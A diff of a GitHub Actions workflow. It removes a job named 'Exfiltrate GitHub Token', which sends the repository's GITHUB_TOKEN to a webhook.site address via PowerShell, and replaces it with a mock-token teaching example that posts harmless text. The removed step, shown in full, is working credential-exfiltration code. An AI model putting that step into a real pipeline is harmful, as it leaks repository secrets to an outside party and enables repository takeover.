@@ -1,19 +1,25 @@
-name: Exfiltrate GitHub Token
-
-on:
-  push:
-    branches: [ master ]
+name: Learn GitHub Actions Security (Safe Example)
+on: [push]
 
 jobs:
-  build:
-    runs-on: windows-latest
-
+  security_test:
+    runs-on: ubuntu-latest
     steps:
       - name: Checkout code
-        uses: actions/checkout@v3
+        uses: actions/checkout@v4
 
-      - name: Exfiltrate GitHub Token via PowerShell
-        env:
-          TOKEN: ${{ secrets.GITHUB_TOKEN }}
+      - name: Simulate a "Token" (Mock Data)
         run: |
-          powershell -Command "Invoke-RestMethod -Uri 'https://webhook.site/b212509f-85c3-4911-a86d-5fdaed053680' -Headers @{Authorization='token $env:TOKEN'}"
+          # This is a FAKE token for learning purposes only
+          echo "MOCK_GITHUB_TOKEN=ghp_thisisnotarealtoken123" >> $GITHUB_ENV
+
+      - name: Print the mock token (Safe)
+        run: |
+          echo "This is how a token could be accessed: ${{ env.MOCK_GITHUB_TOKEN }}"
+          echo "But GitHub masks real secrets automatically."
+
+      - name: Simulate a harmless HTTP request (No real data)
+        run: |
+          curl -X POST https://webhook.site/YOUR_TEST_ENDPOINT \
+            -H "Content-Type: text/plain" \
+            -d "This is a test. No real tokens are sent."
